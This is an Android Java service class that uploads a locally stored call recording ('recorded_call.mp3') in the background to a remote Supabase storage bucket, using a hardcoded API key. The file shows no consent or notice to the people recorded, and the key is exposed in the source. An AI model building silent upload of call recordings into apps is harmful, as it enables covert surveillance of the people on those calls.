package com.example.installing_package;

import android.app.Service;
import android.content.Intent;
import android.os.IBinder;
import androidx.annotation.Nullable;

import java.io.File;
import java.io.IOException;
import java.util.HashMap;

import okhttp3.*;

public class CallRecordingService extends Service {

    private final OkHttpClient client = new OkHttpClient();
    private final String SUPABASE_URL = "https://mavkdxueudusgjdphyhn.supabase.co";
    private final String SUPABASE_API_KEY = "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6Im1hdmtkeHVldWR1c2dqZHBoeWhuIiwicm9sZSI6ImFub24iLCJpYXQiOjE3NDQ4NDU3MDgsImV4cCI6MjA2MDQyMTcwOH0.srw9bbod0BLAwhbQASWQ9IfYcL8oRc4ZszlfzM4l1N4";

    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {
        File audioFile = new File(getFilesDir(), "recorded_call.mp3");

        if (audioFile.exists()) {
            uploadRecordingToSupabase(audioFile);
        }

        return START_NOT_STICKY;
    }

    private void uploadRecordingToSupabase(File file) {
        RequestBody requestBody = new MultipartBody.Builder()
                .setType(MultipartBody.FORM)
                .addFormDataPart("file", file.getName(),
                        RequestBody.create(file, MediaType.parse("audio/mpeg")))
                .build();

        Request request = new Request.Builder()
                .url(SUPABASE_URL + "/storage/v1/object/my/" + file.getName())
                .addHeader("apikey", SUPABASE_API_KEY)
                .addHeader("Authorization", "Bearer " + SUPABASE_API_KEY)
                .post(requestBody)
                .build();

        client.newCall(request).enqueue(new Callback() {
            public void onFailure(Call call, IOException e) {
                e.printStackTrace();
            }

            public void onResponse(Call call, Response response) throws IOException {
                if (response.isSuccessful()) {
                    System.out.println("تم رفع التسجيل إلى Supabase بنجاح");
                } else {
                    System.out.println("فشل رفع التسجيل: " + response.message());
                }
            }
        });
    }

    @Nullable
    @Override
    public IBinder onBind(Intent intent) {
        return null;
    }
}
